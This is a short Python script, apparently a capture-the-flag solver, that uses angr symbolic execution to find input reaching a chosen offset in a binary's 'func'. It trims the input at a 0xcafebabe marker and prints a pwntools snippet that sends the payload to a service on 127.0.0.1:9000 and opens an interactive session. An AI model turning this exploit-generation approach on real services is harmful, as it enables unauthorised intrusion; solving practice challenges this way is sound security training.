#!/usr/bin/env python

import angr
import claripy
import pwn
import argparse

parser = argparse.ArgumentParser(description="Select a filename.")
parser.add_argument("filename", type=str, help="The name of the file to process")
args = parser.parse_args()

# Load the binary for analysis.
proj = angr.Project(f'{args.filename}', auto_load_libs=False)
proj.loader

cfg = proj.analyses.CFGEmulated()
start = cfg.functions['_start']
# Establish a state for solving
state = proj.factory.entry_state(addr=start.addr, args=[f'{args.filename}'])

# Create a simulation mamanger & find a path to the target.
simgr = proj.factory.simgr(state)

# Setup our target
faddr = cfg.functions['func'].addr
simgr.explore(find=[faddr+107], avoid=[faddr+117])

pathcount = len(simgr.found)
print("Length simgr.found: {}".format(pathcount))
if pathcount == 0:
    exit()

# Show the solution!
solution = simgr.found[0]

# Trim up the stdin buffer
buffer = solution.posix.dumps(0)
buffer = buffer[:buffer.find(pwn.p32(0xcafebabe))+4] + b'\n'

# Trim out the unused buffer for the exploit
print(f'# Copy this solution python to a python session/file on the remote')
print(f'import pwn')
print(f'conn = pwn.remote(\'127.0.0.1\', 9000)')
print(f'conn.send({buffer})')
print(f'conn.interactive()')
print(f'conn.close()')
